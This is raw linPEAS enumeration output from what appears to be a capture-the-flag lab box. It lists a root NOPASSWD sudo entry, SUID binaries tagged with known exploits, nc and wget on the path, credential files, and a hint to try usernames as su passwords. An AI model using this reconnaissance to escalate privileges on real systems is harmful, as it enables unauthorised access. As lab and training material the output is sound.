╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                             
Matching Defaults entries for puck on this host:                                                                                                             
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                                                       
ptrace protection is enabled (1)                                                                                                                             

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                   
                                                                                                                                                             
╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                              

╔══════════╣ Users with console
anansi:x:1001:1001:Anansi,,,:/home/anansi:/bin/bash                                                                                                          
backup:x:34:34:backup:/var/backups:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
games:x:5:60:games:/usr/games:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
puck:x:1002:1002:Puck,,,:/home/puck:/bin/bash
reynard:x:1000:1000:Reynard,,,:/home/reynard:/bin/bash
root:x:0:0:root:/root:/bin/bash
sys:x:3:3:sys:/dev:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                       
uid=1000(reynard) gid=1000(reynard) groups=1000(reynard),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),109(sambashare)
uid=1001(anansi) gid=1001(anansi) groups=1001(anansi)
uid=1002(puck) gid=1002(puck) groups=1002(puck)
uid=100(libuuid) gid=101(libuuid) groups=101(libuuid)
uid=101(syslog) gid=103(syslog) groups=103(syslog)
uid=102(messagebus) gid=104(messagebus) groups=104(messagebus)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 19:23:04 up  1:15,  0 users,  load average: 0.16, 0.05, 0.10                                                                                                
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
anansi   tty2         Mon Mar  4 10:58:25 2013 - Mon Mar  4 10:59:41 2013  (00:01)     0.0.0.0                                                               
anansi   tty2         Mon Mar  4 10:58:25 2013 - Mon Mar  4 10:58:25 2013  (00:00)     0.0.0.0
reynard  tty1         Mon Mar  4 10:48:53 2013 - Mon Mar  4 13:43:35 2013  (02:54)     0.0.0.0
reynard  tty1         Mon Mar  4 10:48:53 2013 - Mon Mar  4 10:48:53 2013  (00:00)     0.0.0.0
reboot   system boot  Mon Mar  4 10:40:28 2013 - Mon Mar  4 13:45:38 2013  (03:05)     0.0.0.0
reynard  tty1         Mon Mar  4 10:25:42 2013 - down                      (00:00)     0.0.0.0
reynard  tty1         Mon Mar  4 10:25:42 2013 - Mon Mar  4 10:25:42 2013  (00:00)     0.0.0.0
reboot   system boot  Mon Mar  4 10:21:04 2013 - Mon Mar  4 10:25:56 2013  (00:04)     0.0.0.0

wtmp begins Mon Mar  4 10:21:04 2013

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                            
root             tty1                      Thu Mar  7 22:12:34 -0600 2013
reynard          tty1                      Mon Mar  4 10:48:53 -0600 2013
anansi           tty2                      Tue Mar  5 14:55:49 -0600 2013
puck             tty2                      Tue Mar  5 14:52:00 -0600 2013

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)
                                                                                                                                                             
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                             


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                           
                             ╚══════════════════════╝                                                                                                        
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                              
/bin/nc
/bin/netcat
/usr/bin/perl
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
                                                                                                                                                             
╔══════════╣ Searching mysql credentials and exec
                                                                                                                                                             
╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Jul 20  2012 /usr/share/doc/rsync/examples/rsyncd.conf                                                                           
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                         
drwxr-xr-x 2 root root 4096 Mar  4  2013 /etc/ldap


╔══════════╣ Searching ssl/ssh files
                                                                                                                                                             
══╣ Possible private SSH keys were found!
/etc/ImageMagick/mime.xml

══╣ Some certificates were found (out limited):
/etc/ssl/certs/ACEDICOM_Root.pem                                                                                                                             
/etc/ssl/certs/AC_Raíz_Certicámara_S.A..pem
/etc/ssl/certs/AddTrust_External_Root.pem
/etc/ssl/certs/AddTrust_Low-Value_Services_Root.pem
/etc/ssl/certs/AddTrust_Public_Services_Root.pem
/etc/ssl/certs/AddTrust_Qualified_Certificates_Root.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/America_Online_Root_Certification_Authority_1.pem
/etc/ssl/certs/America_Online_Root_Certification_Authority_2.pem
/etc/ssl/certs/ApplicationCA_-_Japanese_Government.pem
/etc/ssl/certs/A-Trust-nQual-03.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_CA_1.pem
/etc/ssl/certs/Buypass_Class_3_CA_1.pem
/etc/ssl/certs/ca-certificates.crt
/etc/ssl/certs/cacert.org.pem
17371PSTORAGE_CERTSBIN

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                             


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Mar  4  2013 /etc/pam.d                                                                                                          




╔══════════╣ Searching AD cached hashes
-rw------- 1 root root 421888 Mar  4  2013 /var/lib/samba/passdb.tdb                                                                                         

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Mar  4  2013 /usr/share/keyrings                                                                                                 
drwxr-xr-x 2 root root 4096 Mar  4  2013 /var/lib/apt/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                               
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                 
netpgpkeys Not Found
netpgp Not Found                                                                                                                                             
                                                                                                                                                             
-rw------- 1 root root 1200 Mar  4  2013 /etc/apt/trustdb.gpg
-rw-r--r-- 1 root root 12335 Mar  4  2013 /etc/apt/trusted.gpg
-rw------- 1 puck puck 0 Dec 20 19:13 /home/puck/.gnupg/pubring.gpg
-rw------- 1 puck puck 40 Dec 20 19:13 /home/puck/.gnupg/trustdb.gpg
-rw-r--r-- 1 root root 1724 Dec 12  2012 /usr/share/apt/ubuntu-archive.gpg
-rw-r--r-- 1 root root 12335 May 18  2012 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 18  2012 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 18  2012 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 12335 Mar  4  2013 /var/lib/apt/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 933 Feb 21  2013 /var/lib/apt/lists/ca.archive.ubuntu.com_ubuntu_dists_quantal-backports_Release.gpg
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (GNU/Linux)
iEYEABEKAAYFAlEmgAsACgkQQJdur0N9BbXY6QCePR1nUbkL+PEGYYV/vcdnpmL7
hq8AnReKdNcok8ysklBFQawJb6ONwbd9iQIcBAABCgAGBQJRJoALAAoJEDtP5qzA
sh8y/DcP/0/rKP3rY3Urx3o0FjNH7+n+ZfAVLWoHCot7Jn29hVZe4SxguJwy5IAA
RYNL5vwBaacrRHvUqsYZ2F34pFOSdUELi6I0L1HBTWVOixepmTcJLiQ0nFClxVI9
UTSg8Xv7lDVbJf2IwWk/b+ZMEAawYzdMoz+TxZEfY0wGHdAahNs8myHzpoM65blD
sxGk09/kYSqm3UE0GfQ8syzxPuVLH2pAuWR0V9gjY8eS97CDMrq8y6+QHBTDKJDz
Iw71OVKiBDwJOoygAkSgq/J+dTJVPZr6fzph2Wa2Waz0LROW4WdToPUFgP6cN7Co
Vl9eRO754LyUST8A01SAOZFNSESulAPdvH7rCAiifOl6Eo4Y2vqJ7Lr70ymPfKCl
MFr+wXaevsaUtfh8Kds3X07lDQe/WKE5PxIiPY2qxONyCoAzhlESAMSa+O9AamFk
Kn1ex55b1z2pHRkEmxxUMfYX/Tf6QHtM4fcdivT68jgSEMuvRQjr9brl4MwvWam7
7E1yvs95v0d4wgkfO0vGdQjtZqdEYSpIEar1xyZFPJA+6RN4AAURpzCoaGE0gRd3
xduTZBIwYuF9MWlEfUe5ac+2+/mHWFoZvbcQS6HhhKVgydRetk0rrApsX4t5/HnS
xSWhK8wtkWN12msRVV/defrX0iiU/UPcsUWuGgHZ1iepma+Io3x5
=4Bj5
-----END PGP SIGNATURE-----
-rw-r--r-- 1 root root 933 Mar  4  2013 /var/lib/apt/lists/ca.archive.ubuntu.com_ubuntu_dists_quantal_Release.gpg
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (GNU/Linux)
iEYEABEKAAYFAlB/roMACgkQQJdur0N9BbUuqwCfXphzgcusZKYkaTvkFm9wDCQB
IdgAnjHP5RorYIVILIasnine73QyziLoiQIcBAABCgAGBQJQf66DAAoJEDtP5qzA
sh8yjWYP/iGtF+e4Y+HSF3dyk6YVk7Qc+BDMV175Pdhi6h82vjc5x8hd4JY8q5FL
MneG7vH719R0jo7VMGKjWS7Jpq3719oYuLQSFNj393I+cRSIonDZhWwEgvbKb5hS
yXrUV2ihewS2Uor6CtyGwBXIfvfk2KBt639TDibIC6m/3m7rZsey0ms3mv0KNgVc
fDta+SLEjCWwKBZL5C/fBhD98t37vRc1Smr+YwJGOTXW7ZqhGYL2ChOwJLGYaQyM
nK+1AxcAMUA+Ot+VL8OzC+SXaKJk3i7fYCFWxxRswQojwKYfY3H8VMIUFGnmpunQ
1lr5fDkaD0gjAwQmOQQd1/A9g68GDexIHuBgPUb6HIzfGdo+SS83MDtvxvCM8X2Q
2qpfPhW48mzclpbVP2j7Gk8RMWLn9jboMWUfFNK9OwKK+VhW4yLaw5Nh+CWruZ7m
9nAHcBIBJNejTsqp+RkaGkdUhqOD6KGy4RNJsy1irmBlqUB3mfQDoOUF4SMhk+ga
Wyvv4V+E5wcmK8C1Y4a0DBsMoQLusgiUDDJt1aJIDSCMspKxLwxq/JU1gWw7UoP4
DlF6Xb4+krlc35HLME+ZBFSgWtB0puOk5C2qKVwXvCmzj34vD8QgUhADXqmZPVge
6B7jYIxITyfNxr5FRNC14wrPaoeUMSt4oBKl+6ey5iU8qtAVSJ5H
=77PB
-----END PGP SIGNATURE-----
-rw-r--r-- 1 root root 933 Feb 28  2013 /var/lib/apt/lists/ca.archive.ubuntu.com_ubuntu_dists_quantal-updates_Release.gpg
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (GNU/Linux)
iEYEABEKAAYFAlEwMx4ACgkQQJdur0N9BbVDQACfT9OPuCoRWBPd4vcaa8rLSquQ
/rUAn3mQC3aCIHwezVgKAbbvfiwTnOxviQIcBAABCgAGBQJRMDMeAAoJEDtP5qzA
sh8ySMIQAIKv7TsUMdj2jXT1V8SHeCG2l7a6kPifc8b0jlw11D4KOE/HWUU5pj5q
fmSe75bhNTXn1ToUa0MefsGbBmIw4jNYMtJXa48pkNNUTgSXrXyjZ5yeW/LOnZMx
2W5GUYXI1nbe7ngoRhb3ecmYLYDvX9VBhO/B9gzNjOTQyZ8a1/VGsh//Yyjxh7Yr
81WbiPRKYdOoqA6rstJUHS1u51A2LarTxz4bTpOivTgA+V/QeKKRmFJPomGbgFC7
ArzU4bjSl1QhKUGcekfutAJ/Px9byvJOAx67wWvCGO/eOXE6t/cDf7rnCG5krc5x
y4szJdODxNF9xkkm+t8PS/OEn8dlBm7lSyKD7Oqs2zn6JpBpcD1BKBGvkMlUZRPk
dYH+7l6dA7Jcwh5ADPzWKErcPlfHbra988NgKmwq9Q1GMLQgHtYUTq3pwpj6yMEw
JgFqvHPkEUYLiihws633ljOTVzD3VXdTY47NhrhGQRxPKTX8P9WQ8aKd6MROigyK
K1+Wxz/QOqUgy63ZqpNAKt64dFrMZm2Lv+hy1uebcmGtOxcEe9CUuJDb9uAH6WuL
F5EXWZ23qoF1FxAB3uFuln+eEB4mkL6XYYPMR+3a+LfY2+mdcFgxnfI5fC3Xu5Qw
obuFq/ExqxqsHHFmcSq09FR36tH9FuiYLZJySPKbvYWJBIibjOWm
=AM8v
-----END PGP SIGNATURE-----
-rw-r--r-- 1 root root 933 Feb 28  2013 /var/lib/apt/lists/security.ubuntu.com_ubuntu_dists_quantal-security_Release.gpg
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (GNU/Linux)
iEYEABEKAAYFAlEwJRwACgkQQJdur0N9BbVp4ACgosVrCSOA8o3hopkMlAVjPzda
0pEAn28jPekZL2g87pKi/WCaIqb/Yxw1iQIcBAABCgAGBQJRMCUcAAoJEDtP5qzA
sh8ynCYP/1QMcHuFs7WrF7JPhHEYV42HCo3yynftxn6ABrHEv4s3Xh1gF6noBtKf
rsNzp94JZLup5vsZZCWk30grvkLHtYfem1ZZhZOJiWn4o+ECXpYsmPazsZ1ORJwB
+ADg3lPyD/AvfQOv9NzSAoj6ZSlGyPLIem0Tkq3YrPFcs30sLwLZ1pdFn+hs54p1
8yio70rkn5iNuUt71d5Zlyhoq+Sh0YooGiYKHTwYGf5Yatv4/nD7kUgw6WAJIqFu
c37JtGsKiNPMl1URqynQUZZoLeDaxPBF15X8u/lBr0AEYCzjzOwZg/RfG0791lYZ
Xcngk4hA2tvXi7mB90wVNEybK0TPLjAY+VqDi9fUFcB3n1QAFOBZPekJzG8wG4ZY
XiYgi3e6wlFtgTLDJ4Bj5Baa7mwsTLLUKj4jJ1p5Hm4bI4ueF4LUTe+MNSh5Ur5J
rZkm1r+tvGeV4ianwSMW8x75TrrPT4pE/2YI6HVAoDrThZYMfdk9m5jbS7rSCatL
JRPJzWGbCUf7iX05mauVvb9Ta0WZmQnUU+Kjee5KcPMjbaqDCaVzp6zEwxgNg3an
Vu1PWlszZNPu3sk5VkuTaGujGJ4BTp77elpcdfl3rujE5kFt67O1CJcxwq1klhEz
KKGKi46OPU5KobqDzyygobVSlKTT+VwtDRTSADMlHH5abTWiBzVu
=ir5s
-----END PGP SIGNATURE-----

drwx------ 2 puck puck 4096 Dec 20 19:23 /home/puck/.gnupg


╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 696 Jul 23  2012 /usr/share/bash-completion/completions/postfix                                                                       


╔══════════╣ Analyzing Samba Files (limit 70)
-rw-r--r-- 1 root root 12464 Mar  4  2013 /etc/samba/smb.conf                                                                                                
;   logon script = logon.cmd
;   
;   
;   create mask = 0700
;   directory mask = 0700
;   guest ok = yes
;   
# The path below should be writable by all users so that their
;   
;   
;   create mask = 0600
;   directory mask = 0700
   
   
   
   create mask = 0700
   browseable = yes
   
   
;   
;   guest ok = yes
-rw-r--r-- 1 root root 12462 Sep 10  2012 /usr/share/samba/smb.conf
;   logon script = logon.cmd
;   
;   
;   create mask = 0700
;   directory mask = 0700
;   guest ok = yes
;   
# The path below should be writable by all users so that their
;   
;   
;   create mask = 0600
;   directory mask = 0700
   
   
   
   create mask = 0700
   browseable = yes
   
   
;   
;   guest ok = yes

╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3637 Sep 19  2012 /etc/skel/.bashrc                                                                                                   
-rw-r--r-- 1 puck puck 3637 Mar  4  2013 /home/puck/.bashrc



-rw------- 1 puck puck 55 Mar  5  2013 /home/puck/.lesshst


-rw-r--r-- 1 root root 675 Sep 19  2012 /etc/skel/.profile
-rw-r--r-- 1 puck puck 675 Mar  4  2013 /home/puck/.profile






                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                           
                      ╚════════════════════════════════════╝                                                                                                 
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                             
strings Not Found                                                                                                                                            
-rwsr-xr-x 1 root root 63K Sep  6  2012 /bin/umount  --->  BSD/Linux(08-1996)                                                                                
-rwsr-xr-x 1 root root 31K Sep  6  2012 /bin/su
-rwsr-xr-x 1 root root 87K Sep  6  2012 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 30K Jun 11  2012 /bin/fusermount
-rwsr-xr-x 1 root root 39K Oct  2  2012 /bin/ping6
-rwsr-xr-x 1 root root 34K Oct  2  2012 /bin/ping
-rwsr-xr-x 2 root root 113K Feb 27  2013 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 59K Jun 18  2012 /usr/bin/mtr
-rwsr-xr-x 1 root root 31K Sep  6  2012 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 32K Sep  6  2012 /usr/bin/chsh
-rwsr-xr-x 2 root root 113K Feb 27  2013 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerableedit
-rwsr-xr-x 1 root root 40K Sep  6  2012 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 14K Oct  2  2012 /usr/bin/traceroute6.iputils
-rwsr-sr-x 1 daemon daemon 46K Jun 11  2012 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root lpadmin 14K Dec  4  2012 /usr/bin/lppasswd
-rwsr-xr-x 1 root root 41K Sep  6  2012 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 57K Sep  6  2012 /usr/bin/gpasswd
-rwsr-sr-x 1 libuuid libuuid 18K Sep  6  2012 /usr/sbin/uuidd
-rwsr-xr-- 1 root dip 295K Sep 26  2012 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 anansi anansi 8.6K Mar  4  2013 /usr/local/bin/validate (Unknown SUID binary!)
-rwsr-xr-- 1 root messagebus 311K Oct  3  2012 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 243K Sep  6  2012 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 5.4K Jun 25  2012 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 9.6K Oct  3  2012 /usr/lib/pt_chown  --->  GNU_glibc_2.1/2.1.1_-6(08-1999)

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                             
-rwxr-sr-x 1 root tty 18K Sep  6  2012 /usr/bin/wall                                                                                                         
-rwxr-sr-x 1 root shadow 45K Sep  6  2012 /usr/bin/chage
-rwxr-sr-x 1 root crontab 34K Jun 14  2012 /usr/bin/crontab
-rwxr-sr-x 1 root mail 14K Jun 14  2012 /usr/bin/dotlockfile
-rwxr-sr-x 1 root mlocate 34K Aug 14  2012 /usr/bin/mlocate
-rwxr-sr-x 1 root shadow 18K Sep  6  2012 /usr/bin/expiry
-rwxr-sr-x 1 root tty 9.6K Jun 18  2012 /usr/bin/bsd-write
-rwxr-sr-x 3 root mail 9.5K Oct  2  2012 /usr/bin/mail-lock
-rwsr-sr-x 1 daemon daemon 46K Jun 11  2012 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 3 root mail 9.5K Oct  2  2012 /usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 9.5K Oct  2  2012 /usr/bin/mail-unlock
-rwxr-sr-x 1 root ssh 126K Sep  6  2012 /usr/bin/ssh-agent
-rwsr-sr-x 1 libuuid libuuid 18K Sep  6  2012 /usr/sbin/uuidd
-rwxr-sr-x 1 root shadow 30K Jul  3  2012 /sbin/unix_chkpwd

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so                                                                                     
/etc/ld.so.conf                                                                                                                                              
Content of /etc/ld.so.conf:                                                                                                                                  
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/i386-linux-gnu_GL.conf                                                                                                                   
  - /usr/lib/i386-linux-gnu/mesa                                                                                                                             
  /etc/ld.so.conf.d/i686-linux-gnu.conf
  - /lib/i386-linux-gnu                                                                                                                                      
  - /usr/lib/i386-linux-gnu
  - /lib/i686-linux-gnu
  - /usr/lib/i686-linux-gnu
  /etc/ld.so.conf.d/libc.conf
  - /usr/local/lib                                                                                                                                           

/etc/ld.so.preload
╔══════════╣ Capabilities                                                                                                                                    
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                              
══╣ Current shell capabilities                                                                                                                               
CapInh: 0000000000000000                                                                                                                                     
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: ffffffffffffffff

══╣ Parent proc capabilities
CapInh: 0000000000000000                                                                                                                                     
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: ffffffffffffffff


Files with capabilities (limited to 50):

╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root 2139 Oct  9  2012 sbin.dhclient                                                                                                       
-rw-r--r-- 1 root root 1393 Mar 30  2012 usr.sbin.rsyslogd
-rw-r--r-- 1 root root 1418 Aug 20  2012 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                                                                      
files with acls in searched folders Not Found                                                                                                                
                                                                                                                                                             
╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                                                            
total 12                                                                                                                                                     
drwxr-xr-x  2 root root 4096 Mar  4  2013 .
drwxr-xr-x 94 root root 4096 Dec 20 18:07 ..
-rw-r--r--  1 root root  660 Jul 23  2012 bash_completion.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                                              
                                                                                                                                                             
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                 
═╣ Credentials in fstab/mtab? ........... No                                                                                                                 
═╣ Can I read shadow files? ............. No                                                                                                                 
═╣ Can I read shadow plists? ............ No                                                                                                                 
═╣ Can I write shadow plists? ........... No                                                                                                                 
═╣ Can I read opasswd file? ............. No                                                                                                                 
═╣ Can I write in network-scripts? ...... No                                                                                                                 
═╣ Can I read root folder? .............. No                                                                                                                 
                                                                                                                                                             
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                       
/home/puck/checksrv.sh
/root/
/usr/sbin
/usr/sbin/rmt-tar
/usr/sbin/update-ca-certificates
/usr/sbin/pppdump
/usr/sbin/ntpdate-debian
/usr/sbin/grub-install
/usr/sbin/update-initramfs
/usr/sbin/groupdel
/usr/sbin/newusers
/usr/sbin/arpd
/usr/sbin/fdformat
/usr/sbin/cupsdisable
/usr/sbin/install-info
/usr/sbin/lpinfo
/usr/sbin/dpkg-divert
/usr/sbin/laptop-detect
/usr/sbin/update-fonts-dir
/usr/sbin/cppw
/usr/sbin/update-grub
/usr/sbin/update-default-wordlist
/usr/sbin/chat
/usr/sbin/update-gsfontmap
/usr/sbin/lpc
/usr/sbin/logrotate
/usr/sbin/grub-probe
/usr/sbin/tcpdump
/usr/sbin/vipw

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
-rwxr-xr-x 1 root root 513 Mar  6  2013 /home/puck/checksrv.sh                                                                                               

╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                                                             
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                            
/home/puck                                                                                                                                                   
/run/lock
/run/shm
/tmp
/tmp/.ICE-unix
/tmp/.wine-1002
/tmp/.wine-1002/server-ca01-21bec
/tmp/.wine-1002/server-ca01-21bec/lock
/tmp/.X11-unix
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                            
                                                                                                                                                             


                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                          
                            ╚═════════════════════════╝                                                                                                      
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                                                   
/usr/bin/gettext.sh                                                                                                                                          

╔══════════╣ Executable files potentially added by user (limit 70)
2013-03-06+14:23:43.1252193190 /home/puck/checksrv.sh                                                                                                        
2013-03-04+12:13:53.9695248520 /home/puck/.wine/drive_c/windows/system32/xcopy.exe
2013-03-04+12:13:53.9615248540 /home/puck/.wine/drive_c/windows/system32/winebrowser.exe
2013-03-04+12:13:53.9455248530 /home/puck/.wine/drive_c/windows/system32/wmic.exe
2013-03-04+12:13:53.8935248510 /home/puck/.wine/drive_c/windows/system32/services.exe
2013-03-04+12:13:53.8815248520 /home/puck/.wine/drive_c/windows/system32/eject.exe
2013-03-04+12:13:53.8615248500 /home/puck/.wine/drive_c/windows/system32/winemenubuilder.exe
2013-03-04+12:13:53.8495248520 /home/puck/.wine/drive_c/windows/system32/user.exe
2013-03-04+12:13:53.8175248520 /home/puck/.wine/drive_c/windows/system32/gdi.exe
2013-03-04+12:13:53.7815248490 /home/puck/.wine/drive_c/windows/system32/attrib.exe
2013-03-04+12:13:53.7735248500 /home/puck/.wine/drive_c/windows/system32/wscript.exe
2013-03-04+12:13:53.7455248480 /home/puck/.wine/drive_c/windows/system32/regsvr32.exe
2013-03-04+12:13:53.7055248500 /home/puck/.wine/drive_c/windows/system32/winepath.exe
2013-03-04+12:13:53.6895248470 /home/puck/.wine/drive_c/windows/system32/clock.exe
2013-03-04+12:13:53.6855248480 /home/puck/.wine/drive_c/windows/system32/wineconsole.exe
2013-03-04+12:13:53.6055248470 /home/puck/.wine/drive_c/windows/system32/ntoskrnl.exe
2013-03-04+12:13:53.6055248470 /home/puck/.wine/drive_c/windows/system32/cacls.exe
2013-03-04+12:13:53.5855248470 /home/puck/.wine/drive_c/windows/system32/winedbg.exe
2013-03-04+12:13:53.5815248450 /home/puck/.wine/drive_c/windows/system32/icinfo.exe
2013-03-04+12:13:53.5135248460 /home/puck/.wine/drive_c/windows/system32/reg.exe
2013-03-04+12:13:53.5095248460 /home/puck/.wine/drive_c/windows/system32/krnl386.exe
2013-03-04+12:13:53.5095248460 /home/puck/.wine/drive_c/windows/system32/dxdiag.exe
2013-03-04+12:13:53.5015248440 /home/puck/.wine/drive_c/windows/system32/winedevice.exe
2013-03-04+12:13:53.4975248450 /home/puck/.wine/drive_c/windows/system32/view.exe
